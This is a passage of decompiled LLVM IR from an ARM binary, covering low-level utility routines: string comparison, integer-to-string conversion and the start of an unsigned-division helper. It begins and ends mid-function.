  %v0_13128 = phi i32 [ %v1_13128, %dec_label_pc_13128 ], [ 0, %dec_label_pc_13124 ]
  %v1_13128 = add i32 %v0_13128, 1
  %v2_1312c = add i32 %v1_13128, %tmp
  %v3_1312c = inttoptr i32 %v2_1312c to i8*
  %v4_1312c = load i8, i8* %v3_1312c, align 1
  %v2_13130 = icmp eq i8 %v4_1312c, 0
  br i1 %v2_13130, label %dec_label_pc_13138, label %dec_label_pc_13128

dec_label_pc_13138:                               ; preds = %dec_label_pc_13128, %bb
  %v0_1315c = phi i32 [ %v3_13114, %bb ], [ %v1_13128, %dec_label_pc_13128 ]
  %v1_13138 = inttoptr i32 %arg2 to i8*
  %v2_13138 = load i8, i8* %v1_13138, align 1
  %v2_1313c = icmp eq i8 %v2_13138, 0
  br i1 %v2_1313c, label %bb22, label %dec_label_pc_13148

bb22:                                             ; preds = %dec_label_pc_13138
  %v3_13138 = zext i8 %v2_13138 to i32
  br label %dec_label_pc_1315c

dec_label_pc_13148:                               ; preds = %dec_label_pc_13138
  br label %dec_label_pc_1314c

dec_label_pc_1314c:                               ; preds = %dec_label_pc_1314c, %dec_label_pc_13148
  %v0_1314c = phi i32 [ %v1_1314c, %dec_label_pc_1314c ], [ 0, %dec_label_pc_13148 ]
  %v1_1314c = add i32 %v0_1314c, 1
  %v2_13150 = add i32 %v1_1314c, %arg2
  %v3_13150 = inttoptr i32 %v2_13150 to i8*
  %v4_13150 = load i8, i8* %v3_13150, align 1
  %v2_13154 = icmp eq i8 %v4_13150, 0
  br i1 %v2_13154, label %dec_label_pc_1315c, label %dec_label_pc_1314c

dec_label_pc_1315c:                               ; preds = %dec_label_pc_1314c, %bb22
  %v0_131884 = phi i32 [ %v3_13138, %bb22 ], [ %v1_1314c, %dec_label_pc_1314c ]
  %v9_1315c = icmp eq i32 %v0_1315c, %v0_131884
  br i1 %v9_1315c, label %dec_label_pc_13188.preheader, label %dec_label_pc_13168

dec_label_pc_13188.preheader:                     ; preds = %dec_label_pc_1315c
  %v2_131886 = icmp eq i32 %v0_1315c, 0
  br i1 %v2_131886, label %dec_label_pc_13190, label %dec_label_pc_13170

dec_label_pc_13168:                               ; preds = %dec_label_pc_13170, %dec_label_pc_1315c
  ret i32 0

dec_label_pc_13170:                               ; preds = %dec_label_pc_13180, %dec_label_pc_13188.preheader
  %v0_13188.in = phi i32 [ %v0_13188, %dec_label_pc_13180 ], [ %v0_1315c, %dec_label_pc_13188.preheader ]
  %v0_13184 = phi i32 [ %v1_13184, %dec_label_pc_13180 ], [ %arg2, %dec_label_pc_13188.preheader ]
  %v0_13180 = phi i32 [ %v1_13180, %dec_label_pc_13180 ], [ %tmp, %dec_label_pc_13188.preheader ]
  %v0_13188 = add i32 %v0_13188.in, -1
  %v1_13170 = inttoptr i32 %v0_13180 to i8*
  %v2_13170 = load i8, i8* %v1_13170, align 1
  %v1_13174 = inttoptr i32 %v0_13184 to i8*
  %v2_13174 = load i8, i8* %v1_13174, align 1
  %v9_13178 = icmp eq i8 %v2_13170, %v2_13174
  br i1 %v9_13178, label %dec_label_pc_13180, label %dec_label_pc_13168

dec_label_pc_13180:                               ; preds = %dec_label_pc_13170
  %v1_13180 = add i32 %v0_13180, 1
  %v1_13184 = add i32 %v0_13184, 1
  %v2_13188 = icmp eq i32 %v0_13188, 0
  br i1 %v2_13188, label %dec_label_pc_13190, label %dec_label_pc_13170

dec_label_pc_13190:                               ; preds = %dec_label_pc_13180, %dec_label_pc_13188.preheader
  ret i32 1

; uselistorder directives
  uselistorder i8 %v2_13138, { 1, 0 }
  uselistorder i8 %v2_13114, { 1, 0 }
}

define i32 @function_13198(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13198:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_1319c = load i8, i8* %arg1, align 1
  %v2_131a0 = icmp eq i8 %v2_1319c, 0
  %v0_131a4 = load i32, i32* %r2.global-to-local, align 4
  br i1 %v2_131a0, label %bb, label %dec_label_pc_131b0

bb:                                               ; preds = %dec_label_pc_13198
  %v3_1319c = zext i8 %v2_1319c to i32
  br label %dec_label_pc_131c4

dec_label_pc_131b0:                               ; preds = %dec_label_pc_13198
  br label %dec_label_pc_131b4

dec_label_pc_131b4:                               ; preds = %dec_label_pc_131b4, %dec_label_pc_131b0
  %v0_131b4 = phi i32 [ %v1_131b4, %dec_label_pc_131b4 ], [ 0, %dec_label_pc_131b0 ]
  %v1_131b4 = add i32 %v0_131b4, 1
  %v2_131b8 = add i32 %v1_131b4, %tmp
  %v3_131b8 = inttoptr i32 %v2_131b8 to i8*
  %v4_131b8 = load i8, i8* %v3_131b8, align 1
  %v2_131bc = icmp eq i8 %v4_131b8, 0
  br i1 %v2_131bc, label %dec_label_pc_131c4, label %dec_label_pc_131b4

dec_label_pc_131c4:                               ; preds = %dec_label_pc_131b4, %bb
  %v9_131ec = phi i32 [ %v3_1319c, %bb ], [ %v1_131b4, %dec_label_pc_131b4 ]
  %v0_131c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_131c4 = inttoptr i32 %v0_131c4 to i8*
  %v2_131c4 = load i8, i8* %v1_131c4, align 1
  %v3_131c4 = zext i8 %v2_131c4 to i32
  %v2_131c8 = icmp eq i8 %v2_131c4, 0
  br i1 %v2_131c8, label %bb26, label %dec_label_pc_131d4

bb26:                                             ; preds = %dec_label_pc_131c4
  store i32 %v3_131c4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_131e8

dec_label_pc_131d4:                               ; preds = %dec_label_pc_131c4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_131d8

dec_label_pc_131d8:                               ; preds = %dec_label_pc_131d8, %dec_label_pc_131d4
  %v0_131d8 = phi i32 [ %v1_131d8, %dec_label_pc_131d8 ], [ 0, %dec_label_pc_131d4 ]
  %v1_131d8 = add i32 %v0_131d8, 1
  store i32 %v1_131d8, i32* %r2.global-to-local, align 4
  %v2_131dc = add i32 %v1_131d8, %v0_131c4
  %v3_131dc = inttoptr i32 %v2_131dc to i8*
  %v4_131dc = load i8, i8* %v3_131dc, align 1
  %v2_131e0 = icmp eq i8 %v4_131dc, 0
  br i1 %v2_131e0, label %dec_label_pc_131e8, label %dec_label_pc_131d8

dec_label_pc_131e8:                               ; preds = %dec_label_pc_131d8, %bb26
  %v1_131e8 = phi i32 [ %v3_131c4, %bb26 ], [ %v1_131d8, %dec_label_pc_131d8 ]
  %v2_131e8 = sub i32 %v0_131a4, %v1_131e8
  %v4_131e8 = xor i32 %v1_131e8, %v0_131a4
  %v5_131e8 = xor i32 %v2_131e8, %v0_131a4
  %v6_131e8 = and i32 %v5_131e8, %v4_131e8
  %v7_131ec = icmp sgt i32 %v0_131a4, %v1_131e8
  br i1 %v7_131ec, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_131e8
  %v10_131ec = sub i32 %v0_131a4, %v9_131ec
  %v12_131ec = xor i32 %v9_131ec, %v0_131a4
  %v13_131ec = xor i32 %v10_131ec, %v0_131a4
  %v14_131ec = and i32 %v13_131ec, %v12_131ec
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_131e8, %bb27
  %v2_131f0.in = phi i32 [ %v6_131e8, %dec_label_pc_131e8 ], [ %v14_131ec, %bb27 ]
  %v1_131f0.in = phi i32 [ %v2_131e8, %dec_label_pc_131e8 ], [ %v10_131ec, %bb27 ]
  %v1_131e8.pn = phi i32 [ %v1_131e8, %dec_label_pc_131e8 ], [ %v9_131ec, %bb27 ]
  %v0_131f0 = icmp eq i32 %v0_131a4, %v1_131e8.pn
  %v1_131f0 = icmp slt i32 %v1_131f0.in, 0
  %v2_131f0 = icmp slt i32 %v2_131f0.in, 0
  %v3_131f0 = xor i1 %v2_131f0, %v1_131f0
  %v4_131f0 = or i1 %v0_131f0, %v3_131f0
  br i1 %v4_131f0, label %dec_label_pc_13200.preheader, label %dec_label_pc_13218

dec_label_pc_13200.preheader:                     ; preds = %bb28
  %v2_132005 = icmp eq i32 %v0_131a4, 0
  br i1 %v2_132005, label %dec_label_pc_13220, label %dec_label_pc_13208

dec_label_pc_131f8:                               ; preds = %dec_label_pc_13208
  %v1_131f8 = add i32 %v0_131f8, 1
  %v1_131fc = add i32 %v0_131fc, 1
  store i32 %v1_131fc, i32* %r1.global-to-local, align 4
  %v2_13200 = icmp eq i32 %v0_13200, 0
  br i1 %v2_13200, label %dec_label_pc_13220, label %dec_label_pc_13208

dec_label_pc_13208:                               ; preds = %dec_label_pc_131f8, %dec_label_pc_13200.preheader
  %v0_13200.in = phi i32 [ %v0_13200, %dec_label_pc_131f8 ], [ %v0_131a4, %dec_label_pc_13200.preheader ]
  %v0_131fc = phi i32 [ %v1_131fc, %dec_label_pc_131f8 ], [ %v0_131c4, %dec_label_pc_13200.preheader ]
  %v0_131f8 = phi i32 [ %v1_131f8, %dec_label_pc_131f8 ], [ %tmp, %dec_label_pc_13200.preheader ]
  %v0_13200 = add i32 %v0_13200.in, -1
  %v1_13208 = inttoptr i32 %v0_131f8 to i8*
  %v2_13208 = load i8, i8* %v1_13208, align 1
  %v3_13208 = zext i8 %v2_13208 to i32
  store i32 %v3_13208, i32* %r2.global-to-local, align 4
  %v1_1320c = inttoptr i32 %v0_131fc to i8*
  %v2_1320c = load i8, i8* %v1_1320c, align 1
  %v9_13210 = icmp eq i8 %v2_13208, %v2_1320c
  br i1 %v9_13210, label %dec_label_pc_131f8, label %dec_label_pc_13218

dec_label_pc_13218:                               ; preds = %dec_label_pc_13208, %bb28
  ret i32 0

dec_label_pc_13220:                               ; preds = %dec_label_pc_131f8, %dec_label_pc_13200.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v0_131f8, { 1, 0 }
  uselistorder i32 %v0_131fc, { 1, 0 }
  uselistorder i32 %v1_131e8, { 0, 3, 1, 2 }
  uselistorder i32 %v1_131d8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_131a4, { 0, 6, 1, 2, 3, 7, 9, 4, 5, 8 }
  uselistorder i8 %v2_1319c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 5, 4, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @function_13228(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13228:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-62 = alloca i32, align 4
  %stack_var_-30 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_13228 = load i32, i32* @r4, align 4
  store i32 %v3_13228, i32* %stack_var_-28, align 4
  %v22_13228 = ptrtoint i32* %stack_var_-28 to i32
  %v0_1322c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1322c, i32* %r8.global-to-local, align 4
  %v2_1322c = icmp eq i32 %v0_1322c, 0
  store i1 %v2_1322c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v2_1322c, label %dec_label_pc_1331c, label %dec_label_pc_1323c

dec_label_pc_1323c:                               ; preds = %dec_label_pc_13228
  %v3_1323c = icmp eq i8 %arg1, 0
  store i1 %v3_1323c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1323c, label %.thread, label %dec_label_pc_13250

.thread:                                          ; preds = %dec_label_pc_1323c
  %v4_13244 = inttoptr i32 %v0_1322c to i8*
  store i8 48, i8* %v4_13244, align 1
  %v0_13248.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13248.pr.pr, label %.thread1, label %dec_label_pc_13250

.thread1:                                         ; preds = %.thread
  %v4_13248 = load i32, i32* %r8.global-to-local, align 4
  %v5_13248 = add i32 %v4_13248, 1
  %v6_13248 = inttoptr i32 %v5_13248 to i8*
  store i8 0, i8* %v6_13248, align 1
  %v0_1324c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1324c.pr.pr, label %dec_label_pc_1331c, label %dec_label_pc_13250

dec_label_pc_13250:                               ; preds = %dec_label_pc_1323c, %.thread, %.thread1
  %tmp40 = icmp slt i8 %arg1, 0
  %v7_13254 = icmp eq i32 %arg2, 10
  store i1 %v7_13254, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13254, label %bb, label %.thread22

.thread22:                                        ; preds = %dec_label_pc_13250
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_13250
  %v4_13250 = zext i1 %tmp40 to i32
  store i32 %v4_13250, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp40, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  br i1 %phitmp, label %.thread4, label %dec_label_pc_13278

.thread4:                                         ; preds = %bb, %.thread22
  br label %dec_label_pc_13288

dec_label_pc_13278:                               ; preds = %bb
  %v2_13278 = sub nsw i32 0, %tmp
  store i1 %v3_1323c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1323c, label %dec_label_pc_13328, label %dec_label_pc_13288

dec_label_pc_13288:                               ; preds = %dec_label_pc_13278, %.thread4
  %v0_1329010 = phi i32 [ %tmp, %.thread4 ], [ %v2_13278, %dec_label_pc_13278 ]
  %storemerge = phi i32 [ 0, %.thread4 ], [ 1, %dec_label_pc_13278 ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r6.global-to-local, align 4
  %v2_1328c = ptrtoint i32* %stack_var_-30 to i32
  store i32 %v2_1328c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13290

dec_label_pc_13290:                               ; preds = %bb38, %dec_label_pc_13288
  %v2_132b0 = phi i32 [ %v5_132b0, %bb38 ], [ %v2_1328c, %dec_label_pc_13288 ]
  %v0_132ac = phi i32 [ %v2_132b4, %bb38 ], [ %v0_1329010, %dec_label_pc_13288 ]
  %v0_13294 = load i32, i32* %r5.global-to-local, align 4
  %v2_13298 = urem i32 %v0_132ac, %v0_13294
  store i32 %v2_13298, i32* %r0.global-to-local, align 4
  %v7_1329c = icmp eq i32 %v2_13298, 9
  store i1 %v7_1329c, i1* %cpsr_z.global-to-local, align 1
  %v1_132a0 = add i32 %v2_13298, 48
  store i32 %v0_13294, i32* %r1.global-to-local, align 4
  %v7_132a8 = icmp sgt i32 %v2_13298, 9
  %extract.t = trunc i32 %v1_132a0 to i8
  br i1 %v7_132a8, label %bb37, label %bb38

bb37:                                             ; preds = %dec_label_pc_13290
  %v9_132a8 = add i32 %v2_13298, 55
  %extract.t21 = trunc i32 %v9_132a8 to i8
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_13290, %bb37
  %v0_132b0.off0 = phi i8 [ %extract.t, %dec_label_pc_13290 ], [ %extract.t21, %bb37 ]
  store i32 %v0_132ac, i32* %r0.global-to-local, align 4
  %v3_132b0 = inttoptr i32 %v2_132b0 to i8*
  store i8 %v0_132b0.off0, i8* %v3_132b0, align 1
  %v4_132b0 = load i32, i32* %r7.global-to-local, align 4
  %v5_132b0 = add i32 %v4_132b0, -1
  store i32 %v5_132b0, i32* %r7.global-to-local, align 4
  %v0_132b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_132b4 = load i32, i32* %r1.global-to-local, align 4
  %v2_132b4 = udiv i32 %v0_132b4, %v1_132b4
  store i32 %v2_132b4, i32* %r0.global-to-local, align 4
  %v2_132b8 = icmp ugt i32 %v1_132b4, %v0_132b4
  store i1 %v2_132b8, i1* %cpsr_z.global-to-local, align 1
  %v0_132bc = load i32, i32* %r6.global-to-local, align 4
  %v1_132bc = add i32 %v0_132bc, -1
  store i32 %v1_132bc, i32* %r6.global-to-local, align 4
  br i1 %v2_132b8, label %dec_label_pc_132c4, label %dec_label_pc_13290

dec_label_pc_132c4:                               ; preds = %bb38
  %v0_132c4 = load i32, i32* %sl.global-to-local, align 4
  %v2_132c4 = icmp eq i32 %v0_132c4, 0
  store i1 %v2_132c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_132c4, label %bb39, label %dec_label_pc_1332c

bb39:                                             ; preds = %dec_label_pc_132c4
  store i32 %v0_132bc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_132d0

dec_label_pc_132d0:                               ; preds = %bb39, %dec_label_pc_1332c
  %v1_132dc = phi i32 [ %v0_132bc, %bb39 ], [ %v1_132d4.pre, %dec_label_pc_1332c ]
  %v2_132d0 = ptrtoint i32* %stack_var_-62 to i32
  %v2_132d4 = add i32 %v1_132dc, %v2_132d0
  %v3_132d4 = inttoptr i32 %v2_132d4 to i8*
  %v4_132d4 = load i8, i8* %v3_132d4, align 1
  %v6_132d4 = zext i8 %v4_132d4 to i32
  store i32 %v6_132d4, i32* %r2.global-to-local, align 4
  %v2_132d8 = icmp eq i8 %v4_132d4, 0
  store i1 %v2_132d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_132d4, i32* %r1.global-to-local, align 4
  br i1 %v2_132d8, label %dec_label_pc_13300, label %dec_label_pc_132e4

dec_label_pc_132e4:                               ; preds = %dec_label_pc_132d0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_132e8

dec_label_pc_132e8:                               ; preds = %dec_label_pc_132e8, %dec_label_pc_132e4
  %v0_132e8 = phi i32 [ %v1_132e8, %dec_label_pc_132e8 ], [ 0, %dec_label_pc_132e4 ]
  %v1_132e8 = add i32 %v0_132e8, 1
  store i32 %v1_132e8, i32* %r2.global-to-local, align 4
  %v2_132ec = add i32 %v1_132e8, %v2_132d4
  %v3_132ec = inttoptr i32 %v2_132ec to i8*
  %v4_132ec = load i8, i8* %v3_132ec, align 1
  %v2_132f0 = icmp eq i8 %v4_132ec, 0
  store i1 %v2_132f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_132f0, label %dec_label_pc_132f8, label %dec_label_pc_132e8

dec_label_pc_132f8:                               ; preds = %dec_label_pc_132e8
  %v7_132f8 = icmp eq i32 %v0_132e8, -2
  store i1 %v7_132f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_132f8, label %dec_label_pc_1331c, label %dec_label_pc_13300

dec_label_pc_13300:                               ; preds = %dec_label_pc_132f8, %dec_label_pc_132d0
  %v0_1330818 = phi i32 [ %v1_132e8, %dec_label_pc_132f8 ], [ %v6_132d4, %dec_label_pc_132d0 ]
  store i32 %v2_132d4, i32* %r0.global-to-local, align 4
  %v0_13304 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_13304, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13308

dec_label_pc_13308:                               ; preds = %dec_label_pc_13308.dec_label_pc_13308_crit_edge, %dec_label_pc_13300
  %v2_13314 = phi i32 [ %v5_13314, %dec_label_pc_13308.dec_label_pc_13308_crit_edge ], [ %v0_13304, %dec_label_pc_13300 ]
  %v0_1330c = phi i32 [ %v0_1330c.pre, %dec_label_pc_13308.dec_label_pc_13308_crit_edge ], [ %v2_132d4, %dec_label_pc_13300 ]
  %v0_13308 = phi i32 [ %v0_13308.pre, %dec_label_pc_13308.dec_label_pc_13308_crit_edge ], [ %v0_1330818, %dec_label_pc_13300 ]
  %v1_13308 = add i32 %v0_13308, -1
  store i32 %v1_13308, i32* %r2.global-to-local, align 4
  %v1_1330c = inttoptr i32 %v0_1330c to i8*
  %v2_1330c = load i8, i8* %v1_1330c, align 1
  %v5_1330c = add i32 %v0_1330c, 1
  store i32 %v5_1330c, i32* %r0.global-to-local, align 4
  %v3_13310 = icmp eq i32 %v0_13308, 0
  store i1 %v3_13310, i1* %cpsr_z.global-to-local, align 1
  %v3_13314 = inttoptr i32 %v2_13314 to i8*
  store i8 %v2_1330c, i8* %v3_13314, align 1
  %v4_13314 = load i32, i32* %r1.global-to-local, align 4
  %v5_13314 = add i32 %v4_13314, 1
  store i32 %v5_13314, i32* %r1.global-to-local, align 4
  br i1 %v3_13310, label %dec_label_pc_1331c, label %dec_label_pc_13308.dec_label_pc_13308_crit_edge

dec_label_pc_13308.dec_label_pc_13308_crit_edge:  ; preds = %dec_label_pc_13308
  %v0_13308.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_1330c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13308

dec_label_pc_1331c:                               ; preds = %dec_label_pc_13308, %.thread1, %dec_label_pc_13228, %dec_label_pc_132f8
  %v0_1331c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1331c, i32* %r0.global-to-local, align 4
  %v2_13324 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_13324, i32* @r4, align 4
  ret i32 %v0_1331c

dec_label_pc_13328:                               ; preds = %dec_label_pc_13278
  store i32 32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1332c

dec_label_pc_1332c:                               ; preds = %dec_label_pc_132c4, %dec_label_pc_13328
  %v1_13330 = phi i32 [ %v1_132bc, %dec_label_pc_132c4 ], [ 32, %dec_label_pc_13328 ]
  %v2_13330 = add i32 %v1_13330, %v22_13228
  store i32 %v2_13330, i32* %r2.global-to-local, align 4
  %v3_13338 = add i32 %v2_13330, -34
  %v4_13338 = inttoptr i32 %v3_13338 to i8*
  store i8 45, i8* %v4_13338, align 1
  %v1_132d4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_132d0

; uselistorder directives
  uselistorder i32 %v5_13314, { 1, 0 }
  uselistorder i1 %v3_13310, { 1, 0 }
  uselistorder i32 %v0_1330c, { 1, 0 }
  uselistorder i1 %v7_132f8, { 1, 0 }
  uselistorder i32 %v1_132e8, { 0, 1, 3, 2 }
  uselistorder i32 %v2_132d4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_132b4, { 1, 0 }
  uselistorder i32 %v5_132b0, { 1, 0 }
  uselistorder i32 %v2_13298, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 1, 0 }
  uselistorder i1 %v3_1323c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1322c, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 1, 7, 8, 2, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 1, 2, 3, 4, 5 }
  uselistorder i8 45, { 1, 0 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder i32 48, { 6, 2, 0, 5, 3, 7, 1, 8, 4, 9 }
  uselistorder i32 9, { 4, 58, 7, 32, 5, 33, 9, 31, 27, 10, 30, 8, 3, 34, 28, 2, 29, 35, 11, 36, 12, 37, 13, 38, 14, 39, 15, 40, 16, 41, 42, 17, 18, 19, 20, 0, 21, 22, 1, 23, 24, 25, 54, 43, 44, 26, 45, 46, 47, 48, 49, 50, 51, 52, 53, 55, 56, 57, 59, 60, 6, 61 }
  uselistorder i32 32, { 41, 59, 60, 43, 42, 44, 52, 45, 53, 46, 54, 47, 55, 4, 3, 6, 5, 8, 7, 10, 9, 51, 12, 11, 13, 15, 14, 17, 16, 18, 19, 21, 20, 48, 49, 56, 57, 22, 58, 23, 24, 0, 25, 1, 2, 26, 27, 28, 29, 30, 32, 31, 34, 33, 36, 35, 37, 38, 39, 40, 50 }
  uselistorder i32 10, { 76, 0, 4, 5, 32, 12, 37, 38, 3, 39, 40, 33, 13, 41, 34, 42, 14, 43, 15, 44, 16, 45, 17, 46, 18, 47, 48, 19, 1, 20, 21, 22, 23, 24, 25, 6, 49, 50, 51, 52, 53, 54, 55, 56, 57, 7, 58, 59, 60, 8, 61, 62, 63, 26, 64, 9, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 10, 77, 78, 2, 30, 35, 79, 28, 80, 31, 36, 11, 81, 27, 82, 29 }
  uselistorder i8 0, { 18, 19, 0, 5, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 2, 31, 32, 33, 34, 8, 35, 1, 7, 6, 9, 36, 37, 38, 39, 40, 15, 41, 42, 45, 16, 43, 44, 14, 46, 47, 48, 49, 50, 51, 10, 52, 53, 11, 54, 55, 56, 58, 59, 4, 62, 13, 68, 63, 64, 60, 61, 12, 17, 65, 66, 67, 3, 69, 70, 57, 71, 72, 73, 74, 75, 76, 77 }
  uselistorder label %dec_label_pc_1332c, { 1, 0 }
  uselistorder label %dec_label_pc_1331c, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_132d0, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_13250, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_13340 = add i32 %arg2, -1
  %v7_13340 = icmp eq i32 %arg2, 1
  br i1 %v7_13340, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_13344 = load i32, i32* @r0, align 4
  ret i32 %v2_13344

bb80:                                             ; preds = %entry
  %v2_13340 = icmp eq i32 %arg2, 0
  br i1 %v2_13340, label %dec_label_pc_13428, label %dec_label_pc_1334c

dec_label_pc_1334c:                               ; preds = %bb80
  %v0_1334c = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_1334c, %arg2
  br i1 %tmp, label %dec_label_pc_13354, label %dec_label_pc_133e0

dec_label_pc_13354:                               ; preds = %dec_label_pc_1334c
  %v2_13354 = and i32 %v1_13340, %arg2
  %v4_13354 = icmp eq i32 %v2_13354, 0
  br i1 %v4_13354, label %dec_label_pc_133ec, label %dec_label_pc_1335c

dec_label_pc_1335c:                               ; preds = %dec_label_pc_13354
  %v3_1335c = icmp ult i32 %arg2, 536870912
  br i1 %v3_1335c, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1335c
  %v4_13360 = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1335c, %.thread
  %v0_13380.pr36.ph = phi i32 [ %v4_13360, %.thread ], [ %arg2, %dec_label_pc_1335c ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1335c ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_13380.pr36 = phi i32 [ %v4_13374, %bb83 ], [ %v0_13380.pr36.ph, %.preheader.preheader ]
  %v1_13378 = phi i32 [ %v4_13378, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_1336c = icmp ugt i32 %v0_13380.pr36, 268435455
  br i1 %v2_1336c, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_13380thread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_13370 = icmp ult i32 %v0_13380.pr36, %v0_1334c
  br i1 %v4_13370, label %bb82, label %dec_label_pc_13380thread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_13374 = and i32 %v0_13380.pr36, 268435456
  %v3_13374 = icmp eq i32 %v2_13374, 0
  %v4_13374 = mul i32 %v0_13380.pr36, 16
  br i1 %v3_13374, label %bb83, label %dec_label_pc_13380.loopexit

bb83:                                             ; preds = %bb82
  %v2_13378 = and i32 %v1_13378, 268435456
  %v3_13378 = icmp eq i32 %v2_13378, 0
  %v4_13378 = mul i32 %v1_13378, 16
  br i1 %v3_13378, label %.preheader, label %dec_label_pc_13380thread-pre-split.loopexit.loopexit

dec_label_pc_13380thread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_1338c48.ph = phi i32 [ %v1_13378, %bb81 ], [ %v4_13378, %bb83 ]
  %v0_13380.pr38.ph = phi i32 [ %v0_13380.pr36, %bb81 ], [ %v4_13374, %bb83 ]
  br label %dec_label_pc_13380thread-pre-split.loopexit

dec_label_pc_13380thread-pre-split.loopexit:      ; preds = %dec_label_pc_13380thread-pre-split.loopexit.loopexit, %.thread2
  %v1_1338c48 = phi i32 [ %v1_13378, %.thread2 ], [ %v1_1338c48.ph, %dec_label_pc_13380thread-pre-split.loopexit.loopexit ]
  %v0_13380.pr38 = phi i32 [ %v0_13380.pr36, %.thread2 ], [ %v0_13380.pr38.ph, %dec_label_pc_13380thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_13380thread-pre-split

dec_label_pc_13380thread-pre-split:               ; preds = %dec_label_pc_13380thread-pre-split.loopexit, %bb85
  %v1_1338c46 = phi i32 [ %v1_1338c48, %dec_label_pc_13380thread-pre-split.loopexit ], [ %v3_1338c, %bb85 ]
